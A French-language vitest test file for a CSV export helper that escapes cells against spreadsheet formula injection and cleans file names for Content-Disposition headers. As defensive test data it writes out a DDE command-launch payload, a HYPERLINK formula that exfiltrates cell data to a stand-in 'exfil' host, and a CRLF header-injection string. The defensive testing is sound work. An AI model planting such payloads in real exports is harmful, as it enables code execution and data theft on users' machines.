import { describe, it, expect } from 'vitest';
import { echapperCelluleCsv, ligneCsv, nettoyerNomFichier } from '@/lib/csv.js';

/**
 * Échappement des cellules CSV des exports d'administration.
 *
 * Deux exigences se testent ici, et elles tirent en sens contraire :
 * une cellule hostile doit cesser d'être une formule pour Excel, et une
 * cellule ordinaire doit ressortir strictement identique — sans quoi les
 * exports deviennent illisibles et l'échappement finit par être retiré.
 *
 * Le scénario d'attaque n'est pas théorique : `referer`, `userAgent`, `name`
 * et `company` arrivent en base par `POST /api/affiliate/track` et
 * `POST /api/prospects`, deux endpoints publics non authentifiés. Un visiteur
 * anonyme choisit donc le contenu d'une cellule que l'administrateur ouvrira.
 */

describe('echapperCelluleCsv — neutralisation des formules', () => {
  it('neutralise une cellule commençant par « = »', () => {
    expect(echapperCelluleCsv('=1+1')).toBe("'=1+1");
  });

  it('neutralise une cellule commençant par « @ »', () => {
    expect(echapperCelluleCsv('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('neutralise une cellule commençant par « + »', () => {
    expect(echapperCelluleCsv('+1+1')).toBe("'+1+1");
  });

  it('neutralise une cellule commençant par « - »', () => {
    expect(echapperCelluleCsv('-2+3')).toBe("'-2+3");
  });

  it('neutralise une tabulation ou un retour chariot en tête, qu Excel ignore avant la formule', () => {
    // La tabulation est un caractère de champ valide : pas d'encadrement requis.
    expect(echapperCelluleCsv('\t=1+1')).toBe("'\t=1+1");
    // Le retour chariot, lui, casserait la ligne : il est encadré en plus.
    expect(echapperCelluleCsv('\r=1+1')).toBe("\"'\r=1+1\"");
  });

  it('neutralise la charge DDE classique et l échappe puisqu elle contient des guillemets', () => {
    expect(echapperCelluleCsv('=cmd|\'/c calc\'!A1')).toBe("'=cmd|'/c calc'!A1");
    expect(echapperCelluleCsv('=HYPERLINK("http://exfil/?d="&A2,"clic")')).toBe(
      '"\'=HYPERLINK(""http://exfil/?d=""&A2,""clic"")"',
    );
  });
});

describe('echapperCelluleCsv — échappement CSV normal', () => {
  it('encadre une valeur contenant un point-virgule', () => {
    expect(echapperCelluleCsv('SARL Dupont; Fils')).toBe('"SARL Dupont; Fils"');
  });

  it('encadre une valeur contenant une virgule', () => {
    expect(echapperCelluleCsv('Dupont, Éléonore')).toBe('"Dupont, Éléonore"');
  });

  it('double les guillemets et encadre la valeur', () => {
    expect(echapperCelluleCsv('Société "Le Phare"')).toBe('"Société ""Le Phare"""');
  });

  it('encadre une valeur contenant un saut de ligne', () => {
    expect(echapperCelluleCsv('1 rue de l Église\n77000 Melun')).toBe('"1 rue de l Église\n77000 Melun"');
  });

  it('encadre sur le séparateur demandé comme sur l autre', () => {
    // Le fichier DAS2 est en « ; » ; il doit rester lisible ouvert en « , ».
    expect(echapperCelluleCsv('a,b', { separateur: ';' })).toBe('"a,b"');
    expect(echapperCelluleCsv('a;b', { separateur: ',' })).toBe('"a;b"');
  });
});

describe('echapperCelluleCsv — valeurs ordinaires laissées intactes', () => {
  it('ne touche pas à une valeur normale', () => {
    expect(echapperCelluleCsv('Cabinet Martin')).toBe('Cabinet Martin');
    expect(echapperCelluleCsv('contact@finarent.fr')).toBe('contact@finarent.fr');
    expect(echapperCelluleCsv('FR7630001007941234567890185')).toBe('FR7630001007941234567890185');
    expect(echapperCelluleCsv('PENDING')).toBe('PENDING');
    expect(echapperCelluleCsv('https://finarent.fr/simulateur')).toBe('https://finarent.fr/simulateur');
  });

  it('préserve les accents', () => {
    expect(echapperCelluleCsv('Prêt professionnel — validé')).toBe('Prêt professionnel — validé');
  });

  it('laisse un montant négatif calculable par le tableur', () => {
    expect(echapperCelluleCsv(-1250.5)).toBe('-1250.5');
    expect(echapperCelluleCsv((-1250.5).toFixed(2))).toBe('-1250.50');
  });

  it('conserve l indicatif d un numéro de téléphone en le passant en texte', () => {
    // Sans apostrophe, Excel évaluerait « +33612345678 » et perdrait le « + ».
    expect(echapperCelluleCsv('+33612345678')).toBe("'+33612345678");
  });
});

describe('echapperCelluleCsv — valeurs vides, nombres et dates', () => {
  it('rend une cellule vide sur null et undefined', () => {
    expect(echapperCelluleCsv(null)).toBe('');
    expect(echapperCelluleCsv(undefined)).toBe('');
    expect(echapperCelluleCsv('')).toBe('');
  });

  it('sérialise les nombres sans les altérer', () => {
    expect(echapperCelluleCsv(0)).toBe('0');
    expect(echapperCelluleCsv(1200)).toBe('1200');
    expect(echapperCelluleCsv(12.5)).toBe('12.5');
  });

  it('rend une cellule vide sur NaN et Infinity plutôt que du texte parasite', () => {
    expect(echapperCelluleCsv(NaN)).toBe('');
    expect(echapperCelluleCsv(Infinity)).toBe('');
  });

  it('sérialise une date en ISO et absorbe une date invalide', () => {
    expect(echapperCelluleCsv(new Date('2026-09-09T10:00:00.000Z'))).toBe('2026-09-09T10:00:00.000Z');
    expect(echapperCelluleCsv(new Date('pas une date'))).toBe('');
  });
});

describe('ligneCsv', () => {
  it('assemble une ligne ordinaire sans rien modifier', () => {
    expect(ligneCsv(['2026-09-09', 'Cabinet Martin', 'PENDING', 1200])).toBe(
      '2026-09-09,Cabinet Martin,PENDING,1200',
    );
  });

  it('neutralise la cellule hostile sans décaler les colonnes voisines', () => {
    expect(ligneCsv(['2026-09-09', '=1+1', null, 'PENDING'])).toBe("2026-09-09,'=1+1,,PENDING");
  });

  it('respecte le séparateur point-virgule du fichier DAS2', () => {
    expect(ligneCsv(['AFF-01', 'SARL Dupont; Fils', '1500.00'], { separateur: ';' })).toBe(
      'AFF-01;"SARL Dupont; Fils";1500.00',
    );
  });

  it('garde le compte des colonnes constant quelles que soient les valeurs', () => {
    const ligne = ligneCsv(['a"b', 'c,d', '=e', null, 42], { separateur: ',' });
    // Un analyseur CSV correct doit y voir cinq champs.
    expect(ligne).toBe('"a""b","c,d",\'=e,,42');
  });
});

describe('nettoyerNomFichier', () => {
  it('conserve un code ordinaire', () => {
    expect(nettoyerNomFichier('AFF-2026')).toBe('AFF-2026');
  });

  it('neutralise ce qui casserait l en-tête Content-Disposition', () => {
    expect(nettoyerNomFichier('a"b\r\nX-Injecte: 1')).toBe('a-b-X-Injecte-1');
  });

  it('retombe sur la valeur de repli quand il ne reste rien', () => {
    expect(nettoyerNomFichier('///', 'centre')).toBe('centre');
    expect(nettoyerNomFichier(null, 'affilie')).toBe('affilie');
  });
});
